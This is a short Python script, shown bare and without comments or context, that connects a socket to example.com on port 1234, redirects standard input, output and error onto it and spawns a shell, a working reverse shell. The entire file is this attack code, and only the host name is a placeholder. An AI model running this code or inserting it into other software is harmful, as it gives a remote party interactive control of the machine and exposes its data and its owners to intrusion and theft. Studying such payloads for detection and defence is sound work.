import os
import pty
import socket

s = socket.socket()
s.connect(("example.com", 1234))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
pty.spawn("sh")
